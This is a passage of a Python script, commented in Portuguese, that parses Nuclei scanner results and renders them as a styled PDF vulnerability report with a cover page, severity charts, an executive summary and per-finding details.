#!/usr/bin/env python3
"""
nuclei_report.py — Gerador de relatórios PDF para scans do Nuclei
Uso:
  python nuclei_report.py -i results.jsonl -o report.pdf
  python nuclei_report.py -i results.jsonl -o report.pdf --title "Pentest ACME" --author "João Silva"
  python nuclei_report.py --demo
  python nuclei_report.py --demo --author "Red Team" --title "Avaliação Trimestral"
"""

import argparse
import json
import sys
import os
import math
from datetime import datetime

# ── ReportLab ──────────────────────────────────────────────────────────────────
from reportlab.lib.pagesizes import A4
from reportlab.lib import colors
from reportlab.lib.units import cm, mm
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.enums import TA_LEFT, TA_CENTER, TA_RIGHT, TA_JUSTIFY
from reportlab.platypus import (
    SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle,
    PageBreak, KeepTogether,
)
from reportlab.platypus.flowables import Flowable
from reportlab.pdfgen import canvas as rl_canvas

# ══════════════════════════════════════════════════════════════════════════════
#  Paleta — tema totalmente escuro (pure black)
# ══════════════════════════════════════════════════════════════════════════════
BLACK        = colors.HexColor("#000000")
DARK_BG      = colors.HexColor("#0A0A0A")   # fundo das páginas
PANEL_BG     = colors.HexColor("#111111")   # painéis / cards
PANEL_MID    = colors.HexColor("#1A1A1A")   # alternância de linhas
BORDER_COLOR = colors.HexColor("#2A2A2A")
BORDER_LIGHT = colors.HexColor("#333333")
ACCENT       = colors.HexColor("#00C8FF")   # ciano elétrico
ACCENT2      = colors.HexColor("#0066CC")   # azul escuro (gradiente simulado)
TEXT_PRIMARY = colors.HexColor("#E8E8E8")
TEXT_MUTED   = colors.HexColor("#666666")
TEXT_DIM     = colors.HexColor("#444444")
GREEN        = colors.HexColor("#00FF88")
WHITE        = colors.HexColor("#FFFFFF")

CRITICAL_CLR = colors.HexColor("#FF2D2D")
HIGH_CLR     = colors.HexColor("#FF6B35")
MEDIUM_CLR   = colors.HexColor("#FFB627")
LOW_CLR      = colors.HexColor("#4FC3F7")
INFO_CLR     = colors.HexColor("#78909C")

SEVERITY_COLOR = {
    "critical": CRITICAL_CLR,
    "high":     HIGH_CLR,
    "medium":   MEDIUM_CLR,
    "low":      LOW_CLR,
    "info":     INFO_CLR,
    "unknown":  TEXT_MUTED,
}

SEVERITY_ORDER = ["critical", "high", "medium", "low", "info", "unknown"]

PAGE_W, PAGE_H = A4
MARGIN         = 2 * cm
USABLE_W       = PAGE_W - 2 * MARGIN

# ══════════════════════════════════════════════════════════════════════════════
#  Utilitários
# ══════════════════════════════════════════════════════════════════════════════

def safe(text: str, max_len: int = 400) -> str:
    """Escapa HTML e trunca."""
    return (str(text)[:max_len]
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;"))


def hex_color(c: colors.Color) -> str:
    """Converte Color para hex #RRGGBB."""
    r = int(c.red * 255)
    g = int(c.green * 255)
    b = int(c.blue * 255)
    return f"#{r:02X}{g:02X}{b:02X}"


# ══════════════════════════════════════════════════════════════════════════════
#  Estilos
# ══════════════════════════════════════════════════════════════════════════════

def make_styles():
    def P(name, **kw):
        defaults = dict(fontName="Helvetica", fontSize=9, textColor=TEXT_PRIMARY,
                        leading=13, spaceBefore=0, spaceAfter=0,
                        backColor=None)
        defaults.update(kw)
        return ParagraphStyle(name, **defaults)

    return {
        "h1":         P("h1",  fontName="Helvetica-Bold", fontSize=15,
                          textColor=ACCENT, spaceBefore=12, spaceAfter=5),
        "h2":         P("h2",  fontName="Helvetica-Bold", fontSize=12,
                          textColor=WHITE,  spaceBefore=8,  spaceAfter=3),
        "h3":         P("h3",  fontName="Helvetica-Bold", fontSize=10,
                          textColor=ACCENT, spaceBefore=6,  spaceAfter=2),
        "body":       P("body", fontSize=9, textColor=TEXT_PRIMARY,
                          leading=14, alignment=TA_JUSTIFY),
        "code":       P("code", fontName="Courier", fontSize=7.2,
                          textColor=GREEN, leading=10.5,
                          backColor=BLACK, borderPadding=(5, 7, 5, 7)),
        "label":      P("label", fontName="Helvetica-Bold", fontSize=7.5,
                          textColor=TEXT_MUTED, leading=11),
        "value":      P("value", fontSize=8.5, textColor=TEXT_PRIMARY, leading=12),
        "muted":      P("muted", fontSize=8,   textColor=TEXT_MUTED),
        "small":      P("small", fontSize=7,   textColor=TEXT_DIM),
        "centered":   P("centered", fontSize=9, textColor=TEXT_PRIMARY,
                          alignment=TA_CENTER),
        "badge_text": P("badge_text", fontName="Helvetica-Bold", fontSize=7.5,
                          textColor=WHITE, alignment=TA_CENTER),
    }


# ══════════════════════════════════════════════════════════════════════════════
#  Flowables customizados
# ══════════════════════════════════════════════════════════════════════════════

class FullPageBackground(Flowable):
    """Preenche o fundo da página com DARK_BG — inserido no início de cada página."""
    def __init__(self):
        super().__init__()
        self.width  = 0
        self.height = 0

    def draw(self):
        c = self.canv
        c.saveState()
        c.setFillColor(DARK_BG)
        c.rect(0, 0, PAGE_W, PAGE_H, stroke=0, fill=1)
        c.restoreState()


class DividerLine(Flowable):
    def __init__(self, width=USABLE_W, color=BORDER_COLOR, thickness=0.5):
        super().__init__()
        self.width     = width
        self.color     = color
        self.thickness = thickness
        self.height    = thickness + 3

    def draw(self):
        self.canv.setStrokeColor(self.color)
        self.canv.setLineWidth(self.thickness)
        self.canv.line(0, self.thickness, self.width, self.thickness)


class AccentBar(Flowable):
    """Barra colorida fina (decoração lateral de seção)."""
    def __init__(self, width=USABLE_W, color=ACCENT, height=1.5):
        super().__init__()
        self.width  = width
        self.color  = color
        self.height = height + 2

    def draw(self):
        self.canv.setFillColor(self.color)
        self.canv.rect(0, 1, self.width, self.height - 2, stroke=0, fill=1)


class SeverityBlock(Flowable):
    """Bloco retangular de severidade com label — usado no cabeçalho de finding."""
    def __init__(self, severity: str, width=60, height=18):
        super().__init__()
        self.severity = severity.lower()
        self.color    = SEVERITY_COLOR.get(self.severity, TEXT_MUTED)
        self.width    = width
        self.height   = height

    def draw(self):
        c = self.canv
        c.setFillColor(self.color)
        c.roundRect(0, 0, self.width, self.height, 3, stroke=0, fill=1)
        c.setFillColor(BLACK)
        c.setFont("Helvetica-Bold", 7.5)
        c.drawCentredString(self.width / 2, 5, self.severity.upper())


class DonutChart(Flowable):
    """Mini rosca proporcional às severidades."""
    def __init__(self, counts: dict, size=110):
        super().__init__()
        self.counts = counts
        self.width  = size
        self.height = size

    def draw(self):
        c    = self.canv
        cx   = self.width / 2
        cy   = self.height / 2
        R    = self.width * 0.44
        r    = self.width * 0.26
        total = sum(self.counts.get(s, 0) for s in SEVERITY_ORDER) or 1
        angle = 90  # start top

        for sev in SEVERITY_ORDER:
            cnt = self.counts.get(sev, 0)
            if cnt == 0:
                continue
            sweep = cnt / total * 360
            col   = SEVERITY_COLOR.get(sev, TEXT_MUTED)
            c.setFillColor(col)
            c.setStrokeColor(DARK_BG)
            c.setLineWidth(1.2)
            c.wedge(cx - R, cy - R, cx + R, cy + R,
                    angle, sweep, stroke=1, fill=1)
            angle += sweep

        # Buraco central
        c.setFillColor(DARK_BG)
        c.circle(cx, cy, r, stroke=0, fill=1)

        # Total no centro
        c.setFillColor(WHITE)
        c.setFont("Helvetica-Bold", 13)
        c.drawCentredString(cx, cy + 2, str(total))
        c.setFont("Helvetica", 6.5)
        c.setFillColor(TEXT_MUTED)
        c.drawCentredString(cx, cy - 8, "findings")


# ══════════════════════════════════════════════════════════════════════════════
#  Canvas — fundo preto + cabeçalho/rodapé em todas as páginas
# ══════════════════════════════════════════════════════════════════════════════

class ReportCanvas(rl_canvas.Canvas):
    def __init__(self, *args, **kwargs):
        self._report_title = kwargs.pop("report_title", "Nuclei Report")
        self._scan_target  = kwargs.pop("scan_target",  "")
        self._author       = kwargs.pop("author",       "")
        self._is_cover     = True   # primeira página = capa (sem header/footer)
        super().__init__(*args, **kwargs)
        self._saved_page_states = []

    def showPage(self):
        self._saved_page_states.append(dict(self.__dict__))
        self._startPage()

    def save(self):
        total = len(self._saved_page_states)
        for idx, state in enumerate(self._saved_page_states):
            self.__dict__.update(state)
            page_num = self._pageNumber
            self._paint_background()
            if page_num > 1:   # capa = página 1, sem header/footer
                self._draw_header()
                self._draw_footer(page_num, total)
            rl_canvas.Canvas.showPage(self)
        rl_canvas.Canvas.save(self)

    def _paint_background(self):
        self.setFillColor(DARK_BG)
        self.rect(0, 0, PAGE_W, PAGE_H, stroke=0, fill=1)

    def _draw_header(self):
        w, h = PAGE_W, PAGE_H
        # Faixa
        self.setFillColor(BLACK)
        self.rect(0, h - 26, w, 26, stroke=0, fill=1)
        # Linha accent
        self.setFillColor(ACCENT)
        self.rect(0, h - 27, w, 1, stroke=0, fill=1)
        # Texto esquerdo
        self.setFont("Helvetica-Bold", 8.5)
        self.setFillColor(ACCENT)
        self.drawString(MARGIN, h - 17, "NUCLEI")
        self.setFont("Helvetica", 8)
        self.setFillColor(TEXT_MUTED)
        self.drawString(MARGIN + 40, h - 17, "Vulnerability Report")
        # Texto direito
        if self._scan_target:
            self.setFont("Helvetica", 7)
            self.setFillColor(TEXT_MUTED)
            self.drawRightString(PAGE_W - MARGIN, h - 17,
                                 f"Target: {self._scan_target[:55]}")

    def _draw_footer(self, page: int, total: int):
        w = PAGE_W
        self.setFillColor(BLACK)
        self.rect(0, 0, w, 20, stroke=0, fill=1)
        self.setFillColor(ACCENT)
        self.rect(0, 20, w, 0.5, stroke=0, fill=1)
        self.setFont("Helvetica", 6.5)
        self.setFillColor(TEXT_MUTED)
        date_str = datetime.now().strftime("%d/%m/%Y %H:%M")
        left = f"Gerado em {date_str}"
        if self._author:
            left += f"  ·  Autor: {self._author}"
        self.drawString(MARGIN, 6.5, left)
        self.drawCentredString(w / 2, 6.5, self._report_title[:60])
        self.drawRightString(w - MARGIN, 6.5, f"Página {page} de {total}")


# ══════════════════════════════════════════════════════════════════════════════
#  Parser / Normalizador
# ══════════════════════════════════════════════════════════════════════════════

def parse_nuclei_jsonl(path: str) -> list:
    with open(path, encoding="utf-8", errors="replace") as f:
        raw = f.read().strip()
    if raw.startswith("["):
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            pass
    findings = []
    for line in raw.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            findings.append(json.loads(line))
        except json.JSONDecodeError:
            continue
    return findings


def _to_str_list(val) -> list:
    """Garante que qualquer valor vire lista de strings — null/str/int/dict nunca explodem."""
    if val is None:
        return []
    if isinstance(val, list):
        return [str(v) for v in val if v is not None]
    if isinstance(val, str):
        return [v.strip() for v in val.replace(";", ",").split(",") if v.strip()]
    if isinstance(val, (int, float)):
        return [str(val)]
    return []  # dict ou tipo inesperado


def _to_list(val) -> list:
    """Converte extracted-results para lista segura (lista, str, dict ou None)."""
    if val is None:
        return []
    if isinstance(val, list):
        return val
    if isinstance(val, str):
        return [val]
    if isinstance(val, dict):
        return [f"{k}: {v}" for k, v in val.items()]
    return [str(val)]


def _fix_matched_at(matched_at: str, host: str, scheme: str = "") -> str:
    """Adiciona scheme a matched-at que vem como host:port (ex: SSL findings)."""
    if not matched_at:
        return matched_at
    if matched_at.startswith("http://") or matched_at.startswith("https://"):
        return matched_at
    inferred = scheme or ("https" if ":443" in matched_at else "http")
    return f"{inferred}://{matched_at}"


def normalize_finding(raw: dict) -> dict:
    info   = raw.get("info") or {}
    sev    = (info.get("severity") or raw.get("severity") or "unknown").lower()
    if sev not in ("critical", "high", "medium", "low", "info"):
        sev = "unknown"

    # extracted-results: pode ser list, dict, str ou None
    ext = _to_list(raw.get("extracted-results", raw.get("extracted_results")))

    # classification pode ser None ou dict
    classification = info.get("classification") or {}
    if not isinstance(classification, dict):
        classification = {}

    cve_ids = _to_str_list(classification.get("cve-id"))
    cwe_ids = _to_str_list(classification.get("cwe-id"))
    cvss    = str(classification.get("cvss-score", "") or "")

    # refs e tags: str, list ou None
    refs = info.get("reference", info.get("references")) or []
    refs = _to_str_list(refs) if not isinstance(refs, list) else [str(r) for r in refs if r]
    tags = info.get("tags") or []
    tags = _to_str_list(tags) if not isinstance(tags, list) else [str(t) for t in tags if t]

    host       = str(raw.get("host", "") or "")
    scheme     = str(raw.get("scheme", "") or "")
    matched_at = str(raw.get("matched-at", raw.get("matched", host)) or "")
    matched_at = _fix_matched_at(matched_at, host, scheme)

    return {
        "template_id":   str(raw.get("template-id", raw.get("templateID", "N/A")) or "N/A"),
        "template_name": str(info.get("name", "N/A") or "N/A"),
        "severity":      sev,
        "description":   str(info.get("description", "") or ""),
        "remediation":   str(info.get("remediation") or info.get("fix") or ""),
        "references":    refs,
        "tags":          tags,
        "cve_ids":       cve_ids,
        "cwe_ids":       cwe_ids,
        "cvss":          cvss,
        "matched_at":    matched_at,
        "ip":            str(raw.get("ip", "") or ""),
        "timestamp":     str(raw.get("timestamp", raw.get("created_at", "")) or ""),
        "request":       str(raw.get("request",  raw.get("curl-command", "")) or "")[:20_000],
        "response":      str(raw.get("response", "") or "")[:20_000],
        "extracted":     ext,
        "matcher_name":  str(raw.get("matcher-name", "") or ""),
        "type":          str(raw.get("type", "") or ""),
        "host":          host,
    }


# ══════════════════════════════════════════════════════════════════════════════
#  Capa Executiva
# ══════════════════════════════════════════════════════════════════════════════

def _cover_wrap(text: str, max_chars: int) -> list:
    words = text.split()
    lines, line = [], ""
    for word in words:
        if len(line) + len(word) + 1 <= max_chars:
            line = (line + " " + word).strip()
        else:
            if line:
                lines.append(line)
            line = word
    if line:
        lines.append(line)
    return lines or [""]


def _cover_donut(c, x, y, size, counts, total):
    cx    = x + size / 2
    cy    = y + size / 2
    R     = size * 0.44
    r_in  = size * 0.27
    angle = 90
    for sev in SEVERITY_ORDER:
        cnt = counts.get(sev, 0)
        if cnt == 0:
            continue
        sweep = cnt / total * 360
        c.setFillColor(SEVERITY_COLOR.get(sev, TEXT_MUTED))
        c.setStrokeColor(BLACK)
        c.setLineWidth(1.5)
        c.wedge(cx - R, cy - R, cx + R, cy + R, angle, sweep, stroke=1, fill=1)
        angle += sweep
    c.setFillColor(colors.HexColor("#030303"))
    c.circle(cx, cy, r_in, stroke=0, fill=1)
    c.setFillColor(WHITE)
    c.setFont("Helvetica-Bold", int(size * 0.15))
    c.drawCentredString(cx, cy + size * 0.03, str(total))
    c.setFont("Helvetica", int(size * 0.08))
    c.setFillColor(TEXT_MUTED)
    c.drawCentredString(cx, cy - size * 0.10, "total")


def draw_executive_cover(c, doc, title, target, author, findings):
    """
    Desenha a capa executiva diretamente no canvas.
    Chamada como onFirstPage callback do SimpleDocTemplate.
    """
    w, h = PAGE_W, PAGE_H

    counts = {s: 0 for s in SEVERITY_ORDER}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    total = len(findings)
    title = title or "Vulnerability Assessment Report"

    # ── Fundo total preto ─────────────────────────────────────────────────────
    c.setFillColor(BLACK)
    c.rect(0, 0, w, h, stroke=0, fill=1)

    # ── Faixa lateral esquerda ────────────────────────────────────────────────
    strip_w = 6
    c.setFillColor(ACCENT)
    c.rect(0, 0, strip_w, h, stroke=0, fill=1)

    # ── Faixa superior ────────────────────────────────────────────────────────
    top_h = h * 0.08
    c.setFillColor(colors.HexColor("#050505"))
    c.rect(0, h - top_h, w, top_h, stroke=0, fill=1)
    c.setFont("Helvetica-Bold", 11)
    c.setFillColor(ACCENT)
    c.drawString(strip_w + 18, h - top_h + 10, "NUCLEI SCANNER")
    c.setFont("Helvetica", 8)
    c.setFillColor(TEXT_MUTED)
    c.drawRightString(w - 20, h - top_h + 10, "Confidential — Security Assessment")

    # ── Área hero ─────────────────────────────────────────────────────────────
    hero_y = h * 0.52
    hero_h = h * 0.30
    c.setFillColor(colors.HexColor("#0D0D0D"))
    c.rect(strip_w, hero_y, w - strip_w, hero_h, stroke=0, fill=1)
    # Grade de pontos
    c.setFillColor(colors.HexColor("#1C1C1C"))
    for dx in range(0, int(w - strip_w), 14):
        for dy in range(0, int(hero_h), 14):
            c.circle(strip_w + dx, hero_y + dy, 0.8, stroke=0, fill=1)
    # Bordas accent
    c.setFillColor(ACCENT)
    c.rect(strip_w, hero_y, w - strip_w, 1.5, stroke=0, fill=1)
    c.rect(strip_w, hero_y + hero_h - 1.5, w - strip_w, 1.5, stroke=0, fill=1)

    cx = strip_w + (w - strip_w) / 2

    # Label decorativo
    c.setFont("Helvetica-Bold", 8)
    c.setFillColor(ACCENT)
    lbl     = "SECURITY  REPORT"
    lbl_w   = c.stringWidth(lbl, "Helvetica-Bold", 8)
    c.setStrokeColor(ACCENT)
    c.setLineWidth(0.6)
    c.line(cx - lbl_w / 2 - 34, hero_y + hero_h - 28,
           cx - lbl_w / 2 - 14, hero_y + hero_h - 28)
    c.line(cx + lbl_w / 2 + 14, hero_y + hero_h - 28,
           cx + lbl_w / 2 + 34, hero_y + hero_h - 28)
    c.drawCentredString(cx, hero_y + hero_h - 31, lbl)

    # Título principal (multi-linha) — posicionado mais abaixo no hero
    title_lines = _cover_wrap(title, 38)
    ty = hero_y + hero_h - 66
    for line in title_lines[:3]:
        font_size = 28 if len(line) < 22 else 22
        c.setFont("Helvetica-Bold", font_size)
        c.setFillColor(WHITE)
        c.drawCentredString(cx, ty, line)
        ty -= font_size * 1.3

    # ── Painel de metadados (altura reduzida) ─────────────────────────────────
    meta_y  = hero_y - 2
    meta_h  = h * 0.085          # era 0.14 — mais compacto
    meta_x0 = strip_w + 1
    c.setFillColor(colors.HexColor("#070707"))
    c.rect(meta_x0, meta_y - meta_h, w - meta_x0, meta_h, stroke=0, fill=1)

    cols_data = [("DATA DO RELATÓRIO", datetime.now().strftime("%d/%m/%Y  %H:%M"))]
    if author:
        cols_data.append(("AUTOR", author[:35]))
    cols_data.append(("TOTAL DE FINDINGS", str(total)))
    cols_data.append(("HOSTS AVALIADOS", str(len(set(f["host"] for f in findings)))))

    col_w = (w - meta_x0) / max(len(cols_data), 1)
    # Posições verticais dentro do painel compacto
    lbl_y = meta_y - meta_h * 0.32   # label no terço superior
    val_y = meta_y - meta_h * 0.72   # valor no terço inferior
    for i, (lbl2, val) in enumerate(cols_data):
        mx = meta_x0 + i * col_w + col_w / 2
        if i > 0:
            c.setStrokeColor(BORDER_COLOR)
            c.setLineWidth(0.4)
            c.line(meta_x0 + i * col_w, meta_y - meta_h + 6,
                   meta_x0 + i * col_w, meta_y - 6)
        c.setFont("Helvetica-Bold", 6)
        c.setFillColor(TEXT_MUTED)
        c.drawCentredString(mx, lbl_y, lbl2)
        c.setFont("Helvetica-Bold", 10)
        c.setFillColor(WHITE)
        c.drawCentredString(mx, val_y, val)

    # ── Painel inferior — gráfico + legenda ───────────────────────────────────
    sev_panel_h = meta_y - meta_h - 2
    c.setFillColor(colors.HexColor("#030303"))
    c.rect(meta_x0, 0, w - meta_x0, sev_panel_h, stroke=0, fill=1)

    donut_size = min(sev_panel_h * 0.75, 115)
    donut_x    = meta_x0 + 22
    donut_y    = (sev_panel_h - donut_size) / 2
    _cover_donut(c, donut_x, donut_y, donut_size, counts, total)

    leg_x   = donut_x + donut_size + 18
    leg_y   = donut_y + donut_size - 10
    for sev in SEVERITY_ORDER:
        cnt = counts.get(sev, 0)
        if cnt == 0:
            continue
        col = SEVERITY_COLOR.get(sev, TEXT_MUTED)
        c.setFillColor(col)
        c.circle(leg_x + 5, leg_y + 4, 4.5, stroke=0, fill=1)
        c.setFont("Helvetica-Bold", 8)
        c.setFillColor(col)
        c.drawString(leg_x + 14, leg_y + 1, sev.upper())
        c.setFont("Helvetica-Bold", 10)
        c.setFillColor(WHITE)
        c.drawString(leg_x + 70, leg_y, str(cnt))
        bar_max = 70
        bar_len = max(3, int(cnt / total * bar_max))
        c.setFillColor(col)
        c.setFillAlpha(0.22)
        c.rect(leg_x + 100, leg_y + 1, bar_max, 8, stroke=0, fill=1)
        c.setFillAlpha(0.90)
        c.rect(leg_x + 100, leg_y + 1, bar_len, 8, stroke=0, fill=1)
        c.setFillAlpha(1)
        leg_y -= 19

    # Linha accent no rodapé
    c.setFillColor(ACCENT)
    c.rect(0, 0, w, 2, stroke=0, fill=1)


# ══════════════════════════════════════════════════════════════════════════════
#  Seções do relatório
# ══════════════════════════════════════════════════════════════════════════════

# Limite global de bytes para request/response (evita OOM com respostas enormes)
_MAX_CONTENT_BYTES = 8_000   # ~8 KB por bloco — suficiente para identificar a vuln
_MAX_LINE_CHARS    = 200     # trunca linhas horizontalmente longas


def _code_block(content: str, styles, max_lines: int = 50) -> list:
    if not content:
        return []
    # Trunca o conteúdo total antes de qualquer processamento
    if len(content) > _MAX_CONTENT_BYTES:
        content = content[:_MAX_CONTENT_BYTES]
        truncated = True
    else:
        truncated = False
    lines = content.splitlines()
    # Trunca linhas muito longas (ex: HTML minificado em 1 linha)
    lines = [l[:_MAX_LINE_CHARS] + ("…" if len(l) > _MAX_LINE_CHARS else "") for l in lines]
    if len(lines) > max_lines:
        omitted = len(lines) - max_lines
        lines = lines[:max_lines] + [f"... [{omitted} linhas omitidas]"]
    elif truncated:
        lines.append(f"... [conteúdo truncado em {_MAX_CONTENT_BYTES} bytes]")
    escaped = "\n".join(
        l.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        for l in lines
    )
    return [Paragraph(escaped.replace("\n", "<br/>"), styles["code"])]


def build_executive_summary(story, styles, findings, title, target, author):
    """Seção de sumário executivo (página 2)."""
    counts = {s: 0 for s in SEVERITY_ORDER}
    for f in findings:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1
    total = len(findings)

    story.append(Paragraph("Sumário Executivo", styles["h1"]))
    story.append(AccentBar())
    story.append(Spacer(1, 0.35 * cm))

    # Parágrafo introdutório
    sev_list = ", ".join(
        f"<b>{counts[s]}</b> {s}"
        for s in SEVERITY_ORDER if counts[s] > 0
    )
    intro = (
        f"Este documento apresenta os resultados do scan de segurança realizado com o Nuclei. "
        f"Foram identificados <b>{total}</b> finding(s): {sev_list}. "
        f"O relatório detalha cada vulnerabilidade encontrada, incluindo a requisição e "
        f"resposta HTTP capturadas durante o scan, informações do template, "
        f"instruções de remediação e referências externas."
    )
    story.append(Paragraph(intro, styles["body"]))
    story.append(Spacer(1, 0.4 * cm))

    # Grid de info geral
    rows_info = [
        ["Alvo / Target",     safe(target or "N/A")],
        ["Data do Scan",      datetime.now().strftime("%d/%m/%Y %H:%M")],
        ["Ferramenta",        "Nuclei — ProjectDiscovery"],
        ["Total de Findings", str(total)],
    ]
    if author:
        rows_info.insert(0, ["Analista / Autor", safe(author)])

    info_cells = [
        [Paragraph(k, styles["label"]),
         Paragraph(v, styles["value"])]
        for k, v in rows_info
    ]
    info_tbl = Table(info_cells, colWidths=[4 * cm, USABLE_W - 4 * cm])
    info_tbl.setStyle(TableStyle([
        ("ROWBACKGROUNDS", (0, 0), (-1, -1), [PANEL_BG, PANEL_MID]),
        ("TOPPADDING",     (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING",  (0, 0), (-1, -1), 4),
        ("LEFTPADDING",    (0, 0), (0, -1),  8),
        ("LEFTPADDING",    (1, 0), (1, -1),  6),
        ("LINEAFTER",      (0, 0), (0, -1),  0.5, BORDER_COLOR),
        ("LINEBELOW",      (0, 0), (-1, -1), 0.3, BORDER_COLOR),
    ]))
    story.append(info_tbl)
    story.append(Spacer(1, 0.5 * cm))

    # Distribuição de severidades
    story.append(Paragraph("Distribuição de Severidades", styles["h2"]))
    story.append(Spacer(1, 0.2 * cm))

    sev_header = [
        Paragraph("Severidade", styles["label"]),
        Paragraph("Qtd", styles["label"]),
        Paragraph("Proporção", styles["label"]),
        Paragraph("Barra Visual", styles["label"]),
    ]
    sev_rows = [sev_header]
    for sev in SEVERITY_ORDER:
        cnt = counts[sev]
        if cnt == 0:
            continue
        col  = SEVERITY_COLOR.get(sev, TEXT_MUTED)
        pct  = cnt / total * 100
        pct_str = f"{pct:.1f}%"
        bar_filled = int(pct / 100 * 30)
        bar = "█" * bar_filled + "░" * (30 - bar_filled)
        sev_rows.append([
            Paragraph(f'<font color="{hex_color(col)}"><b>{sev.upper()}</b></font>',
                      styles["value"]),
            Paragraph(str(cnt), styles["value"]),
            Paragraph(pct_str,  styles["muted"]),
            Paragraph(f'<font color="{hex_color(col)}" size="6">{bar}</font>',
                      styles["small"]),
        ])

    sev_tbl = Table(sev_rows,
                    colWidths=[3.2 * cm, 1.5 * cm, 2 * cm, USABLE_W - 6.7 * cm])
    sev_tbl.setStyle(TableStyle([
        ("BACKGROUND",     (0, 0), (-1, 0), BORDER_LIGHT),
        ("FONTNAME",       (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE",       (0, 0), (-1, -1), 8.5),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [PANEL_BG, PANEL_MID]),
        ("TOPPADDING",     (0, 0), (-1, -1), 5),
        ("BOTTOMPADDING",  (0, 0), (-1, -1), 5),
        ("LEFTPADDING",    (0, 0), (-1, -1), 7),
        ("LINEBELOW",      (0, 0), (-1, -1), 0.3, BORDER_COLOR),
    ]))
    story.append(sev_tbl)
    story.append(Spacer(1, 0.5 * cm))

    # Top riscos
    top = [f for f in findings if f["severity"] in ("critical", "high")][:8]
    if top:
        story.append(Paragraph("Principais Riscos — Ação Imediata Recomendada", styles["h2"]))
        story.append(Spacer(1, 0.15 * cm))
        for f in top:
            col = SEVERITY_COLOR.get(f["severity"], TEXT_MUTED)
            row_data = [[
                Paragraph(f'<font color="{hex_color(col)}"><b>{f["severity"].upper()}</b></font>',
                          styles["value"]),
                Paragraph(safe(f["template_name"]), styles["value"]),
                Paragraph(safe(f["matched_at"], 70), styles["muted"]),
            ]]
            rt = Table(row_data, colWidths=[2.5 * cm, 8 * cm, USABLE_W - 10.5 * cm])
            rt.setStyle(TableStyle([
                ("BACKGROUND",    (0, 0), (-1, -1), PANEL_BG),
                ("LINEBELOW",     (0, 0), (-1, -1), 0.4, BORDER_COLOR),
                ("TOPPADDING",    (0, 0), (-1, -1), 5),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
                ("LEFTPADDING",   (0, 0), (-1, -1), 7),
                ("LINEBEFORE",    (0, 0), (0, -1),  2.5, col),
            ]))
            story.append(rt)

    story.append(PageBreak())


def build_index(story, styles, findings):
    """Índice completo de findings."""
    story.append(Paragraph("Índice de Findings", styles["h1"]))
    story.append(AccentBar())
    story.append(Spacer(1, 0.3 * cm))

    header = [
        Paragraph("#",          styles["label"]),
        Paragraph("Severidade", styles["label"]),
        Paragraph("Template",   styles["label"]),
        Paragraph("Alvo",       styles["label"]),
        Paragraph("CVE / CWE",  styles["label"]),
    ]
    rows = [header]
    for i, f in enumerate(findings, 1):
        col = SEVERITY_COLOR.get(f["severity"], TEXT_MUTED)
        ids = ", ".join(f["cve_ids"] + f["cwe_ids"])[:30] or "—"
        rows.append([
            Paragraph(str(i),   styles["muted"]),
            Paragraph(
                f'<font color="{hex_color(col)}"><b>{f["severity"].upper()}</b></font>',
                styles["value"]),
            Paragraph(safe(f["template_name"], 48), styles["value"]),
            Paragraph(safe(f["matched_at"],    52), styles["muted"]),
            Paragraph(safe(ids),                    styles["muted"]),
        ])

    col_ws = [1 * cm, 2.5 * cm, 6.2 * cm, 5.5 * cm, USABLE_W - 15.2 * cm]
    tbl = Table(rows, colWidths=col_ws)
    tbl.setStyle(TableStyle([
        ("BACKGROUND",     (0, 0), (-1, 0), BORDER_LIGHT),
        ("FONTSIZE",       (0, 0), (-1, -1), 8),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [PANEL_BG, PANEL_MID]),
        ("TOPPADDING",     (0, 0), (-1, -1), 4),
        ("BOTTOMPADDING",  (0, 0), (-1, -1), 4),
        ("LEFTPADDING",    (0, 0), (-1, -1), 5),
        ("LINEBELOW",      (0, 0), (-1, -1), 0.3, BORDER_COLOR),
    ]))
    story.append(tbl)
    story.append(PageBreak())


def build_finding(story, styles, finding, index, total):
    """Bloco detalhado de um finding."""
    sev      = finding["severity"]
    col      = SEVERITY_COLOR.get(sev, TEXT_MUTED)
    col_hex  = hex_color(col)
    usable_w = USABLE_W

    # ── Cabeçalho ─────────────────────────────────────────────────────────────
    hdr = [[
        Paragraph(
            f'<font color="{col_hex}">■</font>  '
            f'<font color="{col_hex}"><b>{sev.upper()}</b></font>  '
            f'<b>{safe(finding["template_name"])}</b>',
            ParagraphStyle("fh", fontName="Helvetica-Bold", fontSize=11,
                           textColor=WHITE, leading=15, backColor=None)
        ),
        Paragraph(f"#{index}/{total}", styles["muted"]),
    ]]
    hdr_tbl = Table(hdr, colWidths=[usable_w - 2 * cm, 2 * cm])
    hdr_tbl.setStyle(TableStyle([
        ("BACKGROUND",    (0, 0), (-1, -1), PANEL_BG),
        ("TOPPADDING",    (0, 0), (-1, -1), 9),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 9),
        ("LEFTPADDING",   (0, 0), (0, 0),   10),
        ("RIGHTPADDING",  (1, 0), (1, 0),   8),
        ("ALIGN",         (1, 0), (1, 0),   "RIGHT"),
        ("VALIGN",        (0, 0), (-1, -1), "MIDDLE"),
        ("LINEBELOW",     (0, 0), (-1, 0),  2, col),
    ]))
    story.append(KeepTogether([hdr_tbl]))

    # ── Metadados ─────────────────────────────────────────────────────────────
    meta = [
        ["Template ID",  finding["template_id"]],
        ["URL / Alvo",   finding["matched_at"]],
        ["IP",           finding["ip"]      or "—"],
        ["Tipo",         finding["type"]    or "—"],
        ["Matcher",      finding["matcher_name"] or "—"],
        ["Timestamp",    finding["timestamp"]    or "—"],
    ]
    if finding["cvss"]:
        meta.append(["CVSS Score", finding["cvss"]])
    if finding["cve_ids"]:
        meta.append(["CVE(s)",  ", ".join(finding["cve_ids"])])
    if finding["cwe_ids"]:
        meta.append(["CWE(s)",  ", ".join(finding["cwe_ids"])])
    if finding["tags"]:
        meta.append(["Tags",    ", ".join(finding["tags"])])

